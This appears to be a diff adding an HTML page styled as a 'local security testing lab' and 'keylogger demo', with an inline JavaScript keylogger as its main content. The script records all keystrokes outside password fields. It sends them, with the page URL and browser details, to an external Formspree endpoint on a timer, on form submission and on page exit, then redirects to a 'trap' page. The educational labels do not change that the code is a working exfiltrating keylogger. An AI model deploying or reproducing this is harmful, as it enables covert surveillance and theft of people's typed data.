@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zero Steed • Security Lab</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: #000000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(10, 10, 10, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
+            padding: 40px;
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid #00ff00;
+            backdrop-filter: blur(10px);
+        }
+        .logo-placeholder {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 3rem;
+            font-weight: bold;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+            letter-spacing: 2px;
+            background: rgba(0, 255, 0, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px dashed #00ff00;
+        }
+        .logo-placeholder img {
+            max-width: 100%;
+            height: auto;
+            max-height: 100px;
+        }
+        h2 {
+            color: #00ff00;
+            text-align: center;
+            margin-bottom: 20px;
+            font-weight: 300;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+        }
+        .sub {
+            color: #00cc00;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        .input-group {
+            margin-bottom: 25px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #00ff00;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        textarea {
+            width: 100%;
+            padding: 15px;
+            background: #111;
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            color: #00ff00;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.3s;
+            resize: vertical;
+        }
+        textarea:focus {
+            box-shadow: 0 0 15px #00ff00;
+            background: #000;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: transparent;
+            border: 2px solid #00ff00;
+            color: #00ff00;
+            font-size: 1.2rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #00ff00;
+            color: #000;
+            box-shadow: 0 0 30px #00ff00;
+        }
+        .warning {
+            margin-top: 25px;
+            text-align: center;
+            color: #666;
+            font-size: 0.8rem;
+            border-top: 1px solid #333;
+            padding-top: 20px;
+        }
+        .warning span {
+            color: #ff4444;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-placeholder">
+            <!-- Replace with your logo if you have one -->
+            <img src="assets/logo.jpeg" alt="Logo" onerror="this.style.display='none'">
+            <span style="display: none;">🔥 ZERO STEED</span>
+        </div>
+        <h2>Local Security Testing Lab</h2>
+        <div class="sub">ethical hacking • keylogger demo</div>
+
+        <form id="trapForm">
+            <div class="input-group">
+                <label for="about">Tell us about yourself (vulnerable input)</label>
+                <textarea id="about" name="about" rows="4" placeholder="Enter any text... (this is a trap)"></textarea>
+            </div>
+            <button type="submit">SUBMIT</button>
+        </form>
+
+        <div class="warning">
+            <span>⚠️ WARNING</span> — Intentionally vulnerable for educational purposes only
+        </div>
+    </div>
+
+    <!-- JavaScript Keylogger with Email Exfiltration (Formspree) -->
+    <script>
+    (function() {
+        // ===== CONFIGURATION =====
+        const FORMSPREE_URL = 'https://formspree.io/f/xvzbblpr';  // Your endpoint
+        const SEND_INTERVAL = 20000; // Send every 20 seconds
+        
+        let keystrokeBuffer = [];
+        let formSubmitted = false;
+        
+        // Format special keys nicely
+        function formatKey(key) {
+            if (key === ' ') return '[SPACE]';
+            if (key === 'Enter') return '[ENTER]\n';
+            if (key === 'Backspace') return '[BACKSPACE]';
+            if (key === 'Tab') return '[TAB]';
+            if (key === 'Escape') return '[ESC]';
+            if (key === 'Control') return '[CTRL]';
+            if (key === 'Alt') return '[ALT]';
+            if (key === 'Shift') return '[SHIFT]';
+            if (key === 'CapsLock') return '[CAPS]';
+            if (key.startsWith('Arrow')) return `[${key}]`;
+            return key;
+        }
+        
+        // Capture all keystrokes on the page
+        document.addEventListener('keydown', function(event) {
+            // Don't log password fields (ethical)
+            if (event.target.type === 'password') return;
+            
+            let key = formatKey(event.key);
+            keystrokeBuffer.push(key);
+            
+            // Optional: console log for debugging
+            console.log('Key logged:', key);
+        });
+        
+        // Periodically send buffer to Formspree
+        setInterval(function() {
+            if (keystrokeBuffer.length > 0 && !formSubmitted) {
+                const data = new FormData();
+                data.append('keystrokes', keystrokeBuffer.join(''));
+                data.append('timestamp', new Date().toString());
+                data.append('url', window.location.href);
+                data.append('userAgent', navigator.userAgent);
+                
+                // Send using fetch (no-cors to avoid CORS issues)
+                fetch(FORMSPREE_URL, {
+                    method: 'POST',
+                    body: data,
+                    mode: 'no-cors'  // We don't need a response
+                }).catch(err => console.log('Send error:', err));
+                
+                console.log(`Sent ${keystrokeBuffer.length} keystrokes`);
+                keystrokeBuffer = [];
+            }
+        }, SEND_INTERVAL);
+        
+        // Handle form submission
+        document.getElementById('trapForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            formSubmitted = true;
+            
+            // Get the full text from the textarea
+            const userInput = document.getElementById('about').value;
+            
+            // Combine buffered keystrokes with the final input
+            const fullText = keystrokeBuffer.join('') + '\n[FORM SUBMITTED: ' + userInput + ']';
+            
+            // Prepare final data
+            const data = new FormData();
+            data.append('keystrokes', fullText);
+            data.append('timestamp', new Date().toString());
+            data.append('url', window.location.href);
+            data.append('submitted', 'true');
+            
+            // Use sendBeacon for reliable delivery during page unload
+            navigator.sendBeacon(FORMSPREE_URL, data);
+            
+            // Redirect to trap page
+            window.location.href = 'trap.html';
+        });
+        
+        // Capture when user leaves without submitting
+        window.addEventListener('beforeunload', function() {
+            if (keystrokeBuffer.length > 0) {
+                const data = new FormData();
+                data.append('keystrokes', keystrokeBuffer.join(''));
+                data.append('timestamp', new Date().toString());
+                data.append('url', window.location.href);
+                data.append('left', 'true');
+                
+                navigator.sendBeacon(FORMSPREE_URL, data);
+            }
+        });
+    })();
+    </script>
+</body>
+</html>
